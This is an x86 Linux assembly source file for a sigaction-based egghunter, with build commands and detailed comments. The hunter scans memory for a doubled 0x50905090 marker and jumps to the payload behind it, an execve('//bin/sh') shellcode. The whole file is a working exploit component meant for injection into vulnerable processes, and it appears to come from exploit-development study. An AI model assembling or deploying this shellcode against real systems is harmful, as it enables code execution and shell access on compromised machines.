; sigaction egghunter shellcode
; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

; Build the code:
; ---------------
; $ nasm -felf32 -o egghunter.o egghunter.asm
; $ ld -o egghunter egghunter.o
;
; Check for nulls:
; ----------------
; $ objdump -D egghunter -M intel
 
global _start
section .text
_start:
pageinc:
    or   cx,0x0fff          ; page alignment and validation, 4095
addrinc:
    inc  ecx                ; increase address value
 
    ; Sigaction
    ; Function prototype:
    ;     int sigaction(int signum, const struct sigaction *act,
    ;          struct sigaction *oldact);
    ; Purpose:
    ;     Used to change an action by a process on receiving a specific
    ;     signal. Can handle any valid signal except for SIGKILL/SIGSTOP
    ;
    ;     Sigaction structure definition as per prototype:
    ;     struct sigaction {
    ;         void     (*sa_handler)(int);
    ;         void     (*sa_sigaction)(int, siginfo_t *, void *);
    ;         sigset_t   sa_mask;
    ;         int        sa_flags;
    ;         void     (*sa_restorer)(void);
    ;     };
    push 0x43               ; sigaction()
    pop  eax
    int  0x80               ; make the call
    cmp  al, 0xf2           ; test for EFAULT
    je   pageinc            ; EFAULT, access next page
    mov  eax,0x50905090     ; Marker code to find
    mov  edi,ecx            ; edi contains address to search
    scasd                   ; look for first marker
    jnz  addrinc            ; no marker found, next address
    scasd                   ; first marker found look for second
    jnz  addrinc            ; no marker found, next address
    jmp  edi                ; found markers jump to shellcode payload
 
    ; Marker bytes, enables hunter code to find the start of the
    ; shellcode payload, must be executable code to work correctly.
    nop                     ; 0x90
    push eax                ; 0x50
    nop
    push eax
    nop
    push eax
    nop
    push eax
 
    ; Execve
    ; Function prototype:
    ;     int execve(const char *fn, char *const argv[],
    ;         char *const envp[])
    ; Purpose:
    ;     to execute a program on a remote and/or compromised
    ;     system. There is no return from using execve therefore
    ;     an exit syscall is not required
    xor eax,eax             ; zero eax register
    xor edx,edx             ; zero edx register
    push edx                ; push null
    push 0x68732f6e         ; hs/n
    push 0x69622f2f         ; ib//
    mov ebx,esp             ; ebx contains address of //bin/sh
    push edx                ; push null
    push ebx                ; push address of //bin/sh
    mov ecx,esp             ; ecx pointer to //bin/sh
    push edx                ; push null
    mov edx,esp             ; edx contains pointer to null
    mov al,0xb              ; execve()
    int 0x80                ; make the call
